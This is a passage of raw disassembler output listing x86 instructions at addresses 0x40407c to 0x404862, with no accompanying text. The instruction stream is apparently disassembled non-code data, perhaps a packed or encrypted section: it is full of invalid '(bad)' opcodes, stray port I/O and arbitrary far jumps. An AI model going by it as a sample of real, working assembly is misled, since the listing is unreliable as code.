  40407c:	mov    cl,0x8f
  40407e:	popf   
  40407f:	sub    al,0x6a
  404081:	mov    edi,0x8ff0b59c
  404086:	inc    ebx
  404087:	cmp    esp,DWORD PTR [eax]
  404089:	int    0x65
  40408b:	cmp    eax,0xe3ddb10a
  404090:	push   eax
  404091:	in     eax,0xa2
  404093:	mov    eax,ds:0x22f777d
  404098:	lahf   
  404099:	cmp    al,BYTE PTR [edx-0x79]
  40409c:	adc    DWORD PTR [esi-0x69],0xffffffb9
  4040a0:	dec    edi
  4040a1:	mov    cl,0x37
  4040a3:	adc    DWORD PTR ds:0x1d4fcfa0,eax
  4040a9:	inc    ebx
  4040aa:	lahf   
  4040ab:	sub    ch,ch
  4040ad:	cmp    DWORD PTR [edx+0x78514651],ebp
  4040b3:	aas    
  4040b4:	xchg   edx,eax
  4040b5:	mov    ecx,0xc41b53e
  4040ba:	or     eax,0xc74cc80e
  4040bf:	jg     0x4040b1
  4040c1:	or     bh,BYTE PTR [esi+0x41dc53b8]
  4040c7:	js     0x4040ed
  4040c9:	cmc    
  4040ca:	mov    ebx,0x229344a5
  4040cf:	fldenv [eax]
  4040d1:	int    0xab
  4040d3:	dec    ecx
  4040d4:	push   ecx
  4040d5:	push   0xb74db2c3
  4040da:	mov    eax,0xa2c278ff
  4040df:	sahf   
  4040e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4040e1:	scas   eax,DWORD PTR es:[edi]
  4040e2:	aas    
  4040e3:	mov    eax,0x76766944
  4040e8:	dec    esi
  4040e9:	in     eax,dx
  4040ea:	aad    0x79
  4040ec:	adc    al,0xb7
  4040ee:	loope  0x4040aa
  4040f0:	lods   eax,DWORD PTR ds:[esi]
  4040f1:	add    BYTE PTR [edx+0x309b0552],al
  4040f7:	outs   dx,DWORD PTR ds:[esi]
  4040f8:	pushf  
  4040f9:	(bad)  
  4040fa:	daa    
  4040fb:	xor    edx,ecx
  4040fd:	ins    BYTE PTR es:[edi],dx
  4040fe:	xchg   DWORD PTR [edx-0x50d85dc2],ebx
  404104:	pop    edx
  404105:	js     0x4040b0
  404107:	nop
  404108:	aam    0x67
  40410a:	sub    ebx,DWORD PTR [edx+0x56a417c5]
  404110:	(bad)  
  404111:	int3   
  404112:	test   DWORD PTR [ebp+0x69bb8cd8],eax
  404118:	sub    dh,cl
  40411a:	mov    ds:0x5998a3d7,eax
  40411f:	mov    eax,ds:0x1a5dbc1b
  404124:	mov    dl,BYTE PTR [ecx]
  404126:	push   ds
  404127:	and    ch,cl
  404129:	lods   eax,DWORD PTR ds:[esi]
  40412a:	inc    esp
  40412b:	pop    esi
  40412c:	push   ss
  40412d:	xchg   ebp,eax
  40412e:	psubsb mm5,QWORD PTR [ecx]
  404131:	pushf  
  404132:	fld    QWORD PTR [ebp+0x119cbc4e]
  404138:	ficomp DWORD PTR [ebx-0x47]
  40413b:	add    cl,dl
  40413d:	repz or al,0x75
  404140:	or     BYTE PTR [ecx-0xb3739e],bh
  404146:	push   edx
  404147:	mov    eax,0xb497eae5
  40414c:	ds lock dec edx
  40414f:	push   ss
  404150:	dec    ecx
  404151:	xchg   esp,eax
  404152:	cmp    eax,0xf56f790c
  404157:	out    dx,eax
  404158:	jecxz  0x4041c0
  40415a:	jmp    0xdf9d:0xfb41fc7e
  404161:	arpl   WORD PTR [esi+0x19],cx
  404164:	inc    edx
  404165:	cld    
  404166:	push   esi
  404167:	paddsb mm3,QWORD PTR [esi+0x5]
  40416b:	jecxz  0x4041e6
  40416d:	test   BYTE PTR [ebx+0x4289d060],cl
  404173:	dec    esp
  404174:	cmp    al,0x5b
  404176:	in     eax,dx
  404177:	das    
  404178:	xchg   DWORD PTR [eax+0x4b],ebx
  40417b:	(bad)  
  40417c:	aaa    
  40417d:	sbb    DWORD PTR [ebp+0x58d269e9],ebx
  404183:	pusha  
  404184:	xchg   ecx,eax
  404185:	iret   
  404186:	xchg   esp,eax
  404187:	xchg   ebx,eax
  404188:	push   ecx
  404189:	stc    
  40418a:	mov    al,0x64
  40418c:	imul   edi,DWORD PTR [eax+0x1204c084],0xffffff86
  404193:	fwait
  404194:	clc    
  404195:	ins    DWORD PTR es:[edi],dx
  404196:	push   esi
  404197:	and    eax,0xc3d72640
  40419c:	push   es
  40419d:	push   ebp
  40419e:	ror    BYTE PTR [ecx+0x4d2ec9e6],1
  4041a4:	cmp    eax,0xbdca657b
  4041a9:	retf   
  4041aa:	leave  
  4041ab:	test   eax,0x2bb2ff76
  4041b0:	mov    esp,0xd2085f1c
  4041b5:	(bad)  
  4041b6:	and    al,0x91
  4041b8:	push   ds
  4041b9:	mov    dl,0x6e
  4041bb:	cmp    ecx,esi
  4041bd:	not    BYTE PTR ds:0x487f04e3
  4041c3:	add    BYTE PTR [edi+0x14],ah
  4041c6:	and    esi,0x78
  4041c9:	add    cl,bl
  4041cb:	mov    dh,0x3a
  4041cd:	sbb    eax,0x9da4f919
  4041d2:	xor    al,0x6
  4041d4:	lods   al,BYTE PTR ds:[esi]
  4041d5:	or     esi,DWORD PTR [edx]
  4041d7:	mov    dl,0xe4
  4041d9:	mov    al,al
  4041db:	jmp    0x4041fa
  4041dd:	jmp    0x99d4:0x1c913c1d
  4041e4:	mov    cs,WORD PTR [esi+esi*8-0x7d572883]
  4041eb:	icebp  
  4041ec:	inc    esi
  4041ed:	cmp    BYTE PTR [edi+0x50],dh
  4041f0:	mov    bh,0x48
  4041f2:	call   0xaf4a6cc7
  4041f7:	sahf   
  4041f8:	push   cs
  4041f9:	repz adc eax,0x76abef6e
  4041ff:	push   es
  404200:	fiadd  WORD PTR [ecx]
  404202:	scas   al,BYTE PTR es:[edi]
  404203:	fnsave [edi+0x44]
  404206:	add    BYTE PTR [edi-0x2a6016a0],0xf6
  40420d:	mov    cs,WORD PTR [edi]
  40420f:	mov    ecx,0x7c9d6173
  404214:	mov    bh,0xb7
  404216:	fisttp QWORD PTR [esi]
  404218:	mov    ebx,0xd438a5c
  40421d:	stos   DWORD PTR es:[edi],eax
  40421e:	or     dh,BYTE PTR [esi+0x57f8e0ff]
  404224:	loope  0x404295
  404226:	pop    ecx
  404227:	dec    ebx
  404228:	dec    esi
  404229:	xchg   ebp,eax
  40422a:	stc    
  40422b:	jnp    0x4041fa
  40422d:	fs ja  0x40420c
  404230:	cmp    eax,0xb7f5de75
  404235:	push   es
  404236:	in     al,dx
  404237:	out    0x5c,al
  404239:	jp     0x404219
  40423b:	xor    BYTE PTR [edx],0xf5
  40423e:	cmp    dh,BYTE PTR [ecx+0x321f52fe]
  404244:	sbb    BYTE PTR [esi+ecx*8-0x2d],0x7b
  404249:	into   
  40424a:	mov    bl,0xff
  40424c:	jmp    0x404249
  40424e:	mov    esp,0x905b071a
  404253:	push   ebx
  404254:	add    BYTE PTR [ebx-0x61],cl
  404257:	bound  edx,QWORD PTR [edx]
  404259:	push   esi
  40425a:	mov    ds,WORD PTR [esi+eax*8+0x6a]
  40425e:	(bad)  
  40425f:	jl     0x40428c
  404261:	sub    cl,BYTE PTR [esi]
  404263:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404264:	pop    edi
  404265:	fwait
  404266:	mov    esp,0x258ec84
  40426b:	mov    dh,0xa5
  40426d:	adc    al,BYTE PTR [edx+0x77]
  404270:	xchg   edx,eax
  404271:	mov    dl,0x7c
  404273:	xchg   edx,eax
  404274:	in     al,dx
  404275:	mov    bh,0x7e
  404277:	jg     0x40424f
  404279:	retf   0xd1da
  40427c:	mov    ds:0x9d0231d,eax
  404281:	in     eax,0xa4
  404283:	pop    es
  404284:	or     bh,0xa7
  404287:	scas   al,BYTE PTR es:[edi]
  404288:	loopne 0x4042b3
  40428a:	xor    BYTE PTR [edi+ecx*2],bh
  40428d:	inc    esi
  40428e:	mov    ebx,0xd3004a67
  404293:	mov    bh,0xae
  404295:	fist   WORD PTR [eax-0x28]
  404298:	bound  ebx,QWORD PTR [ebx]
  40429a:	(bad)  
  40429c:	mov    ds:0x2d71389b,eax
  4042a1:	add    DWORD PTR [esi],ecx
  4042a3:	sar    DWORD PTR [ecx-0x1e61055e],1
  4042a9:	sub    BYTE PTR [eax+0x6f1f9b9a],dh
  4042af:	cs es and al,0xbc
  4042b3:	inc    edi
  4042b4:	jns    0x404283
  4042b6:	imul   esp,DWORD PTR [eax+ebx*1+0x33c10e58],0xe98555a5
  4042c1:	sbb    dl,BYTE PTR [esi]
  4042c3:	adc    bh,BYTE PTR [ebp-0x33cdbd5a]
  4042c9:	push   eax
  4042ca:	fnstenv [esi]
  4042cc:	lds    ebx,FWORD PTR [ebp-0x2d23d160]
  4042d2:	sahf   
  4042d3:	and    BYTE PTR [edx+edi*1-0x76],ch
  4042d7:	xchg   edx,eax
  4042d9:	push   ebx
  4042da:	out    0xb9,eax
  4042dc:	int    0xbb
  4042de:	rep stos BYTE PTR es:[edi],al
  4042e0:	shl    DWORD PTR [edi+ebp*4],0x86
  4042e4:	nop
  4042e5:	dec    esp
  4042e6:	repnz (bad) 
  4042e8:	int3   
  4042e9:	cmp    eax,0x6432a091
  4042ee:	imul   esp,DWORD PTR [esi+0x11],0xe905ce2d
  4042f5:	adc    BYTE PTR [ebx],ah
  4042f7:	out    dx,al
  4042f8:	or     al,0x62
  4042fa:	pop    ebp
  4042fb:	(bad)
  4042ff:	mov    esp,0xe1761ba3
  404304:	or     ah,BYTE PTR [eax-0x64]
  404307:	je     0x4042dd
  404309:	sub    eax,0xcd77ee38
  40430e:	fsubrp st(2),st
  404310:	inc    esp
  404311:	mov    cl,0x29
  404313:	out    0x11,al
  404315:	aas    
  404316:	pop    es
  404317:	out    dx,eax
  404318:	xor    DWORD PTR [ecx+0x3c],eax
  40431b:	push   ds
  40431c:	sub    dh,ch
  40431e:	fucom  st(0)
  404320:	xor    bh,BYTE PTR [ebx-0x21]
  404323:	adc    BYTE PTR [ebp+0x3875eaa5],0x6f
  40432a:	cwde   
  40432b:	pop    edx
  40432c:	push   cs
  40432d:	mov    es,WORD PTR [eax-0x7958e8e7]
  404333:	jmp    0x1ec702d4
  404338:	jp     0x404349
  40433a:	dec    ecx
  40433b:	les    esi,FWORD PTR [eax+0x1180031a]
  404341:	xchg   esp,eax
  404342:	push   ebp
  404343:	or     DWORD PTR [edi+0x4b62cdeb],0xffffffe2
  40434a:	mov    ebp,0x5664813a
  40434f:	xchg   edi,edi
  404351:	imul   ebx,DWORD PTR ds:0x492085cc,0x1c4cb0f5
  40435b:	dec    ecx
  40435c:	dec    ecx
  40435d:	push   cs
  40435e:	pushf  
  40435f:	and    eax,0x342caaad
  404364:	and    bh,BYTE PTR [ebx+0x1925b36f]
  40436a:	outs   dx,BYTE PTR ds:[esi]
  40436b:	jnp    0x404378
  40436d:	add    eax,DWORD PTR fs:[eax-0x1c]
  404371:	dec    ecx
  404372:	std    
  404373:	dec    edi
  404374:	ret    
  404375:	or     bl,BYTE PTR [eax+ebx*8]
  404378:	in     eax,0x7e
  40437a:	iret   
  40437b:	mov    ebp,DWORD PTR [edx]
  40437d:	out    0x4f,al
  40437f:	push   0x2164f6a3
  404384:	(bad)  
  404385:	fadd   QWORD PTR [esi+0x3fc8092c]
  40438b:	sub    ah,BYTE PTR [eax+ebp*8]
  40438e:	inc    eax
  40438f:	xor    ebp,ecx
  404391:	cmp    eax,DWORD PTR [esi-0x7702cdd9]
  404397:	sbb    bl,BYTE PTR [ebx+esi*8-0x11e3d769]
  40439e:	ror    BYTE PTR [ebp-0x36],1
  4043a1:	shl    BYTE PTR [edi-0x246a0ed2],cl
  4043a7:	mov    ds:0x8c926efa,al
  4043ac:	lods   eax,DWORD PTR ds:[esi]
  4043ad:	cmp    al,0x68
  4043af:	push   esp
  4043b0:	pusha  
  4043b1:	push   eax
  4043b2:	fmul   QWORD PTR [eax]
  4043b4:	ret    0x807a
  4043b7:	jo     0x404384
  4043b9:	mov    ah,0x38
  4043bb:	and    BYTE PTR [esp+edx*2+0x355820cd],bh
  4043c2:	cli    
  4043c3:	xchg   di,ax
  4043c5:	mov    dl,0x57
  4043c7:	sbb    eax,0xc89a9e0a
  4043cc:	pop    eax
  4043cd:	hlt    
  4043ce:	mov    ah,BYTE PTR [esi]
  4043d0:	retf   
  4043d1:	cmp    bl,ah
  4043d3:	sar    DWORD PTR [edi+edx*2+0x526ad28e],0x9d
  4043db:	stc    
  4043dc:	ds enter 0x3b34,0xaf
  4043e1:	and    DWORD PTR [eax+ebp*1],ebp
  4043e4:	push   ebp
  4043e5:	ret    0x1c8c
  4043e8:	repz imul esi,DWORD PTR [ebp-0x4],0x78
  4043ed:	aaa    
  4043ee:	mov    esp,DWORD PTR [edx+esi*4]
  4043f1:	xchg   ecx,eax
  4043f2:	and    BYTE PTR [esi-0xa17b266],bl
  4043f8:	ficomp WORD PTR [edx+0x47ecf381]
  4043fe:	(bad)  
  4043ff:	push   ds
  404400:	ss jnp 0x40447a
  404403:	push   0x229948b7
  404408:	and    bl,BYTE PTR [ebx+0x65]
  40440b:	int3   
  40440c:	push   edx
  40440d:	sub    edi,ecx
  40440f:	pop    eax
  404410:	int3   
  404411:	pop    ecx
  404412:	jmp    0xc867:0x17f17140
  404419:	cdq    
  40441a:	lock push ecx
  40441c:	push   ds
  40441d:	mov    al,0xa6
  40441f:	and    ch,dh
  404421:	fld    DWORD PTR [esi]
  404423:	int    0xa1
  404425:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404426:	xchg   ebx,edx
  404428:	sbb    BYTE PTR [edx-0x46],cl
  40442b:	add    edi,ebx
  40442d:	stc    
  40442e:	lods   al,BYTE PTR ds:[esi]
  40442f:	lods   al,BYTE PTR ds:[esi]
  404430:	jge    0x404422
  404432:	(bad)  
  404434:	aad    0xac
  404436:	pushf  
  404437:	rol    DWORD PTR [esp+ebx*1],1
  40443a:	fxch   st(0)
  40443c:	retf   0x45a0
  40443f:	sbb    BYTE PTR [eax+0xc9faa33],cl
  404445:	pop    ds
  404446:	adc    ecx,eax
  404448:	add    esp,DWORD PTR [edi-0x10b1eabc]
  40444e:	in     al,dx
  40444f:	imul   DWORD PTR [ebp-0x7b]
  404452:	in     al,0x9d
  404454:	jo     0x404493
  404456:	push   esp
  404457:	jns    0x4043e6
  404459:	xchg   DWORD PTR [edx],esi
  40445b:	fxch   st(5)
  40445d:	mov    edx,0xfad38e0b
  404462:	lods   al,BYTE PTR ds:[esi]
  404463:	data16 or al,0xd6
  404466:	es and ah,bl
  404469:	jecxz  0x40449f
  40446b:	fsubr  DWORD PTR [eax+0x4c]
  40446e:	mov    dl,0x9b
  404470:	xchg   esp,eax
  404471:	shl    ah,1
  404473:	adc    al,0x63
  404475:	test   BYTE PTR [esi+esi*8],cl
  404478:	(bad)  [ecx+0x7d292f3a]
  40447e:	aaa    
  40447f:	fld    DWORD PTR [esi-0x5bae11b3]
  404485:	jb     0x404434
  404487:	mov    bl,0x40
  404489:	lds    eax,FWORD PTR [ebx]
  40448b:	retf   
  40448c:	mov    cl,0x1d
  40448e:	mov    ebp,0x935c8e91
  404493:	jns    0x404491
  404495:	fs clc 
  404497:	dec    edi
  404498:	sbb    eax,0xa3382e9a
  40449d:	in     al,0xc6
  40449f:	mov    dh,0x43
  4044a1:	and    al,0xcf
  4044a3:	mov    ah,0xff
  4044a5:	in     al,dx
  4044a6:	das    
  4044a7:	aam    0xf7
  4044a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4044aa:	or     esi,0xffffffac
  4044ad:	push   cs
  4044ae:	push   ebx
  4044af:	mov    edi,0x3fe8f72b
  4044b4:	lahf   
  4044b5:	push   ebx
  4044b6:	push   esi
  4044b7:	stos   BYTE PTR es:[edi],al
  4044b8:	call   0x561c4be
  4044bd:	popf   
  4044be:	out    0xc8,eax
  4044c0:	cld    
  4044c1:	iret   
  4044c2:	fmul   DWORD PTR [ebx+0x12]
  4044c5:	in     eax,0xc1
  4044c7:	pop    esp
  4044c8:	scas   al,BYTE PTR es:[edi]
  4044c9:	pop    es
  4044ca:	leave  
  4044cb:	sub    DWORD PTR [eax-0x26416b08],edx
  4044d1:	jno    0x404519
  4044d3:	push   edi
  4044d4:	adc    al,0xff
  4044d6:	imul   esp,esi,0x16
  4044d9:	lods   eax,DWORD PTR ds:[esi]
  4044da:	stos   BYTE PTR es:[edi],al
  4044db:	pop    esp
  4044dc:	xor    al,0x7
  4044de:	clc    
  4044df:	fdivr  DWORD PTR [esi+0x45]
  4044e2:	aas    
  4044e3:	test   eax,0x624f8039
  4044e8:	cmp    esp,DWORD PTR [edi+0x6c58fb17]
  4044ee:	cmp    al,0x72
  4044f0:	xor    eax,0x1ab54a7a
  4044f5:	jbe    0x40450b
  4044f7:	fs in  al,0xfb
  4044fa:	sbb    cl,BYTE PTR [esi-0x72396f9]
  404500:	sub    ebx,edx
  404502:	int3   
  404503:	or     BYTE PTR [edi+0x4e],ch
  404506:	icebp  
  404507:	mov    bl,0xe8
  404509:	fsubr  DWORD PTR [edx]
  40450b:	jp     0x40451f
  40450d:	fbstp  TBYTE PTR cs:[eax]
  404510:	fistp  WORD PTR [ecx-0x7a]
  404513:	xor    ch,cl
  404515:	push   eax
  404516:	sbb    esi,DWORD PTR [ebp-0x58]
  404519:	je     0x4044a7
  40451b:	push   ds
  40451c:	loope  0x4044c9
  40451e:	bound  ecx,QWORD PTR [eax-0x3cd9e1f4]
  404524:	shl    DWORD PTR ds:0x24014a38,0x54
  40452b:	mov    ds:0xcde1d393,eax
  404530:	sar    DWORD PTR [eax-0x34c6b86f],0x3c
  404537:	sbb    BYTE PTR [esp+esi*4-0x213c0db0],dl
  40453e:	hlt    
  40453f:	mov    esp,0xac6e6bf7
  404544:	fldcw  WORD PTR [ebx+0x481984c0]
  40454a:	gs pop ds
  40454c:	pop    ebp
  40454d:	arpl   WORD PTR [ebp-0x7b],di
  404550:	cmp    edx,DWORD PTR [edx+0x549a11c9]
  404556:	jnp    0x40453b
  404558:	leave  
  404559:	mov    DWORD PTR [edi],ebp
  40455b:	sub    al,0x93
  40455d:	and    ebp,edx
  40455f:	les    esp,FWORD PTR [eax-0x697092ad]
  404565:	icebp  
  404566:	outs   dx,DWORD PTR ds:[esi]
  404567:	add    eax,0x2d7f985f
  40456c:	add    BYTE PTR [ebx-0x573dfe03],bl
  404572:	cwde   
  404573:	xor    eax,0xca8e433b
  404578:	out    0xd0,eax
  40457a:	test   DWORD PTR [ecx],eax
  40457c:	clc    
  40457d:	xchg   esi,eax
  40457e:	sbb    ah,BYTE PTR ds:0xac4aac47
  404584:	(bad)  
  404585:	push   ebp
  404586:	push   ebp
  404587:	xchg   esi,eax
  404588:	dec    ecx
  404589:	enter  0xcbf2,0xcf
  40458d:	jbe    0x4045ab
  40458f:	sar    DWORD PTR [ebx],1
  404591:	jns    0x4045f6
  404593:	mov    eax,0x72a1d242
  404598:	jne    0x404613
  40459a:	pop    ss
  40459b:	mov    bh,0x3f
  40459d:	push   ebp
  40459e:	jb     0x404612
  4045a0:	xchg   esp,eax
  4045a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4045a2:	adc    bl,ch
  4045a4:	dec    edx
  4045a5:	test   DWORD PTR [ecx+ecx*8-0x21],ecx
  4045a9:	fwait
  4045aa:	daa    
  4045ab:	sub    bh,BYTE PTR [eax]
  4045ad:	jo     0x404589
  4045af:	jns    0x404541
  4045b1:	cmp    al,0xb0
  4045b3:	call   0x87e5:0x8dacfc75
  4045ba:	fwait
  4045bb:	je     0x40454c
  4045bd:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4045bf:	xchg   ebp,eax
  4045c0:	add    ch,cl
  4045c2:	loopne 0x404587
  4045c4:	jmp    0x40458e
  4045c6:	mov    eax,ds:0xa5c879f5
  4045cb:	stc    
  4045cc:	icebp  
  4045cd:	adc    eax,0xf35cbe72
  4045d3:	cwde   
  4045d4:	cwde   
  4045d5:	mov    bl,0x7
  4045d7:	ds jb  0x404561
  4045da:	inc    ebp
  4045db:	mov    ebx,0x45aed16b
  4045e0:	push   cs
  4045e1:	fnsave [edx+0x1d1fd32c]
  4045e7:	ret    
  4045e8:	pop    ds
  4045e9:	sbb    DWORD PTR [ebp+0x56],ebp
  4045ec:	std    
  4045ed:	scas   al,BYTE PTR es:[edi]
  4045ee:	je     0x4045dd
  4045f0:	xor    eax,0xb1bb2903
  4045f5:	pop    esi
  4045f6:	mov    al,0x8f
  4045f8:	xor    eax,0x1cb2ef3b
  4045fd:	jle    0x4045e0
  4045ff:	dec    esp
  404600:	fcomp  QWORD PTR [ecx+0x48e313a7]
  404607:	call   ebp
  404609:	or     DWORD PTR [edi+0x4757ab00],ebx
  40460f:	cwde   
  404610:	mov    eax,ds:0xc2183f43
  404615:	imul   esi,DWORD PTR [eax+0x7e],0x3d32cc27
  40461c:	out    dx,eax
  40461d:	or     al,0x73
  40461f:	fwait
  404620:	mov    bh,0xc3
  404622:	mov    DWORD PTR [edx-0x20c02699],0x83b32a52
  40462c:	inc    edi
  40462d:	push   cs
  40462e:	jo     0x404625
  404630:	(bad)  
  404631:	loope  0x4045bc
  404633:	mov    es,WORD PTR [ecx-0x5f]
  404636:	xchg   ebx,eax
  404637:	or     dh,ch
  404639:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40463a:	dec    ecx
  40463b:	add    DWORD PTR ds:0x308af3d6,eax
  404641:	fmul   QWORD PTR [edi]
  404643:	es pop eax
  404645:	fist   WORD PTR [eax+0x51]
  404648:	push   0x6e
  40464a:	or     BYTE PTR [ecx-0x2e],bh
  40464d:	bound  esi,QWORD PTR [edi]
  40464f:	push   cs
  404650:	pop    edi
  404651:	fild   DWORD PTR [ebp+0x147f13d1]
  404657:	ds pop ebx
  404659:	sbb    eax,0xe9038a63
  40465e:	cmc    
  40465f:	inc    ebp
  404660:	out    0xf6,eax
  404662:	jmp    0x404627
  404664:	or     esp,DWORD PTR [eax-0x5ae1577c]
  40466a:	mov    ah,0x28
  40466c:	dec    ebx
  40466d:	out    dx,eax
  40466e:	out    dx,al
  40466f:	sbb    BYTE PTR [ebx-0x5f55209b],ch
  404675:	das    
  404676:	sbb    eax,0x9bb6702e
  40467b:	push   ebx
  40467c:	retf   
  40467d:	or     BYTE PTR [ebx],dl
  40467f:	inc    esp
  404680:	cs sub eax,0x74fd77e7
  404686:	ins    BYTE PTR es:[edi],dx
  404687:	push   0x3b
  404689:	sbb    BYTE PTR [edx-0x4bdfd3f2],ah
  40468f:	push   cs
  404690:	jns    0x404665
  404692:	cmc    
  404693:	push   0x62
  404695:	lds    eax,FWORD PTR [ecx]
  404697:	cli    
  404698:	mul    BYTE PTR [edx]
  40469a:	jl     0x4046f5
  40469c:	xor    BYTE PTR [esi+0xc],bl
  40469f:	sbb    BYTE PTR [edi+ebx*8-0x7f],0xcf
  4046a4:	push   edx
  4046a5:	(bad)  
  4046a6:	xor    eax,0x737e48b9
  4046ab:	push   ebp
  4046ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4046ad:	lds    ecx,FWORD PTR [ecx+0x30]
  4046b0:	xchg   esi,eax
  4046b1:	jno    0x404673
  4046b3:	push   eax
  4046b4:	gs popa 
  4046b6:	in     al,dx
  4046b7:	les    eax,FWORD PTR [ecx+ecx*4+0x114cc551]
  4046be:	scas   eax,DWORD PTR es:[edi]
  4046bf:	in     al,0x41
  4046c1:	imul   ebx,esi,0x6c
  4046c4:	xchg   DWORD PTR [esi+0x77641b8e],ecx
  4046ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4046cb:	mov    edi,0x6ed173c9
  4046d0:	popf   
  4046d1:	inc    ebp
  4046d2:	call   0x350a90ea
  4046d7:	dec    eax
  4046d8:	repnz sub DWORD PTR [edx+edx*8+0x1f],edi
  4046dd:	and    edx,DWORD PTR [ecx+edi*4+0x4c777010]
  4046e4:	push   edx
  4046e5:	jle    0x404748
  4046e7:	lods   al,BYTE PTR ds:[esi]
  4046e8:	movsx  edi,WORD PTR [edi]
  4046eb:	cli    
  4046ec:	int    0x62
  4046ee:	daa    
  4046ef:	iret   
  4046f0:	pop    ss
  4046f1:	enter  0xa595,0x3a
  4046f5:	ret    
  4046f6:	clc    
  4046f7:	jmp    0xbee2:0x7ab0f7d0
  4046fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4046ff:	sbb    edx,eax
  404701:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404703:	pop    edi
  404704:	and    ebp,DWORD PTR [ebx]
  404706:	inc    ch
  404708:	sbb    BYTE PTR [eax+ebx*8],dl
  40470b:	sub    eax,DWORD PTR [ebx+eiz*2+0x68]
  40470f:	sub    al,0xc
  404711:	jb     0x4046d2
  404713:	or     al,0x5
  404715:	test   al,0x3
  404717:	rol    DWORD PTR [edi-0x7783e1b0],1
  40471d:	jmp    0x8817:0xedc29740
  404724:	bound  edx,QWORD PTR [ecx]
  404726:	in     eax,dx
  404727:	cwde   
  404728:	sbb    BYTE PTR [ebx+0x31402867],dl
  40472e:	sahf   
  40472f:	or     esi,0xcac02a9f
  404735:	add    DWORD PTR [edi+0x4e],0x42
  404739:	(bad)  
  40473a:	lahf   
  40473b:	mov    bh,0x8d
  40473d:	xchg   ecx,eax
  40473e:	ins    DWORD PTR es:[edi],dx
  40473f:	(bad)  
  404740:	aam    0xdd
  404742:	daa    
  404743:	lock inc edi
  404745:	(bad)  
  404746:	arpl   bp,si
  404748:	(bad)  
  404749:	cld    
  40474a:	jmp    FWORD PTR [ebp+0x5b4d997f]
  404750:	jns    0x4047b3
  404752:	adc    BYTE PTR [edi],0x27
  404755:	les    eax,FWORD PTR ds:0x5f6d7070
  40475b:	les    ebx,FWORD PTR [ebp-0x66]
  40475e:	scas   eax,DWORD PTR es:[edi]
  40475f:	loop   0x40474e
  404761:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404762:	clc    
  404763:	cmp    BYTE PTR gs:[edx],bl
  404766:	lods   al,BYTE PTR ds:[esi]
  404767:	out    0x48,eax
  404769:	shl    ah,cl
  40476b:	xor    DWORD PTR [ebx-0x4fded3e6],esi
  404771:	sti    
  404772:	repz stc 
  404774:	shl    al,0x5c
  404777:	lods   eax,DWORD PTR ds:[esi]
  404778:	jmp    0x5749:0x7ac8ddf3
  40477f:	cli    
  404780:	mov    edi,0x22bf2340
  404785:	ret    0x2394
  404788:	cli    
  404789:	or     al,0x23
  40478b:	adc    bh,BYTE PTR ds:0xc7aa22c9
  404791:	test   al,0x12
  404793:	leave  
  404794:	pop    ecx
  404795:	in     eax,0x9e
  404797:	stos   BYTE PTR es:[edi],al
  404798:	leavew 
  40479a:	fcom   QWORD PTR [eax-0x9]
  40479d:	add    ebx,DWORD PTR [eax]
  40479f:	mov    ch,0x1a
  4047a1:	hlt    
  4047a2:	xor    DWORD PTR [ebx],0x97af5d51
  4047a8:	dec    ecx
  4047a9:	xor    cl,BYTE PTR [ebx-0x28]
  4047ac:	inc    ebp
  4047ad:	cmp    eax,0xd0fe443b
  4047b2:	aad    0x6a
  4047b4:	aam    0x4c
  4047b6:	xchg   BYTE PTR [edx],cl
  4047b8:	fucomi st,st(5)
  4047ba:	fld    TBYTE PTR [eax+0x56cc5524]
  4047c0:	sub    bh,bl
  4047c2:	clc    
  4047c3:	pop    ebp
  4047c4:	or     eax,DWORD PTR [edx]
  4047c6:	mov    al,ds:0x3944174b
  4047cb:	aam    0x35
  4047cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4047ce:	push   edx
  4047cf:	mov    ch,0x87
  4047d1:	cmp    eax,0x45cae889
  4047d6:	add    BYTE PTR [edi+0x62ab9352],0x36
  4047dd:	push   ebx
  4047de:	add    bl,BYTE PTR [edx+ebp*1]
  4047e1:	out    dx,eax
  4047e2:	sub    BYTE PTR [edx-0x16],cl
  4047e5:	je     0x404856
  4047e7:	mov    edi,0xeb2001e
  4047ec:	ror    DWORD PTR [ecx+0x58],cl
  4047ef:	stc    
  4047f0:	or     dl,0x8b
  4047f3:	scas   al,BYTE PTR es:[edi]
  4047f4:	jg     0x404794
  4047f6:	into   
  4047f7:	(bad)  
  4047f8:	fst    DWORD PTR [esi-0x837c58b]
  4047fe:	scas   eax,DWORD PTR es:[edi]
  4047ff:	daa    
  404800:	adc    bl,BYTE PTR [edx-0x6ac63bb8]
  404806:	(bad)  
  404807:	out    0xfc,eax
  404809:	dec    ebx
  40480a:	mov    al,ds:0x4fe075ac
  40480f:	out    dx,eax
  404810:	mov    BYTE PTR [esi+edx*1+0x65242d59],0xd5
  404818:	repnz sbb esp,edx
  40481b:	call   0xdf05c119
  404820:	adc    bh,0x29
  404823:	or     eax,0x933f27dc
  404828:	cmp    eax,0x216dc9f6
  40482d:	and    DWORD PTR [esi],esp
  40482f:	add    ch,BYTE PTR [ebp-0x16]
  404832:	sbb    DWORD PTR [edx],esi
  404834:	fbstp  TBYTE PTR [esi+0x65]
  404837:	outs   dx,BYTE PTR ds:[esi]
  404838:	inc    eax
  404839:	lahf   
  40483a:	mov    ebp,0x457faf2b
  40483f:	fidiv  WORD PTR [eax-0x9]
  404842:	mov    dl,0x93
  404844:	xor    al,0x9a
  404846:	sub    al,0x79
  404848:	inc    eax
  404849:	cdq    
  40484a:	inc    ecx
  40484b:	scas   al,BYTE PTR es:[edi]
  40484c:	sub    BYTE PTR [esi-0x15734d31],0x94
  404853:	nop
  404854:	add    al,0x2a
  404856:	dec    ebx
  404857:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404858:	out    dx,eax
  404859:	gs inc ebp
  40485b:	add    dl,al
  40485d:	mov    BYTE PTR [edx+0x3e],al
  404860:	xchg   esp,eax
  404861:	xchg   edx,eax
  404862:	out    0xb,eax
